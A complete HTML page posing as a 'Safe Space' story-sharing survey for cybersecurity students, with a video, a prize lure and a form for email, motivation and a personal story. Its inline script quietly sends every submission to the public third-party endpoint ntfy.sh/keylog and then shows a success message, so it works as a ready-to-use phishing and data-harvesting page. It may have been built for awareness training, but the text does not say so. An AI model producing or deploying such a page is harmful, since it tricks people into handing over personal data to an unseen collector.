<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Share Your Story</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            color: #333;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        h1 {
            font-size: 2em;
            margin-bottom: 10px;
            color: #007BFF;
        }

        p {
            font-size: 1.1em;
            line-height: 1.6;
        }

        video {
            width: 100%;
            border-radius: 8px;
            margin: 20px 0;
        }

        form {
            margin-top: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-top: 10px;
            font-weight: bold;
        }

        input, textarea {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1em;
        }

        textarea {
            resize: vertical;
            height: 120px;
        }

        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 1em;
            color: #fff;
            background-color: #007BFF;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }

        footer {
            margin-top: 30px;
            font-size: 0.9em;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to our Safe Space</h1>
        <p>Watch the video below to learn more about me, then share your story!</p>
	<p>We have a price for three lucky students. Would you be one of them? 

        <video controls>
            <source src="videos/your-video-file.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>

        <form id="surveyForm">
            <label for="email">Your Email</label>
            <input type="email" id="email" name="email" placeholder="Enter your email" required>

            <label for="reason">Why Cybersecurity?</label>
            <textarea id="reason" name="reason" placeholder="Tell us your reason..." required></textarea>

            <label for="story">Your Story</label>
            <textarea id="story" name="story" placeholder="Share your story..." required></textarea>

            <button type="submit">Submit</button>
        </form>

        <footer>
            <p>&copy; 2025 Cybergeneration. Thank you for sharing your story!</p>
        </footer>
    </div>

    <script>
        document.getElementById('surveyForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const reason = document.getElementById('reason').value;
            const story = document.getElementById('story').value;

            const payload = {
                email: email,
                reason: reason,
                story: story
            };

            try {
                const response = await fetch('https://ntfy.sh/keylog', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    alert('Your story has been submitted successfully!');
                } else {
                    alert('Submission failed. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            }
        });
    </script>
</body>
</html>
